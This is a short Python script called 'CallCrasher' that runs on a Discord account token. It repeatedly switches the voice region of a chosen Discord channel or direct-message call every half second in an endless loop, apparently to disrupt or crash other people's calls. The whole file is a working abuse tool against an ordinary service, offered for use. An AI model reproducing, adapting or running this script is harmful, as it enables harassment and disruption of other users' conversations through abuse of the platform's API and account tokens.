# CallCrasher was proudly coded by wtfTrmed (https://github.com/wtfTrmed).
# Copyright (c) 2021 rodclip#7777
# CallCrasher under the GNU GENERAL PUBLIC LICENSE v3 (2007).

import requests, sys, random, time

DISCORDTOKEN = sys.argv[1]
CHANNELID = sys.argv[2]
CHANNELTYPE = "channel"
REGIONS = []

headers = {
    'Authorization': DISCORDTOKEN,
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36",
    'Content-Type': "application/json",
    'Origin': 'https://discord.com'
}

if len(sys.argv) >= 4:
    CHANNELTYPE = sys.argv[3]
    if CHANNELTYPE != "user":
        CHANNELTYPE = "channel"

request = requests.get("https://discord.com/api/v9/voice/regions", headers=headers).json()

for reg in request:
    if not reg["deprecated"]:
        REGIONS.append(reg["id"])

if CHANNELTYPE == "user":
    channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for channel in channels:
        if channel["type"] == 1:
            if len(channel["recipients"]) == 1:
                if str(channel["recipients"][0]["id"]) == str(CHANNELID):
                    CHANNELID = channel["id"]

if CHANNELID is None:
    sys.exit(-1)

index = 0
while True:
    region = str(REGIONS[index])
    index += 1
    if len(REGIONS) - 1 < index:
        index = 0
    req = requests.patch("https://discord.com/api/v9/channels/" + CHANNELID + "/call", headers=headers,
                         json={'region': region})
    if req.status_code == 204:
        print("Changed region to: " + region)
        time.sleep(0.5)
    else:
        time.sleep(10)
    pass

# CallCrasher was proudly coded by wtfTrmed (https://github.com/wtfTrmed).
# Copyright (c) 2021 rodclip#7777
# CallCrasher under the GNU GENERAL PUBLIC LICENSE v3 (2007).
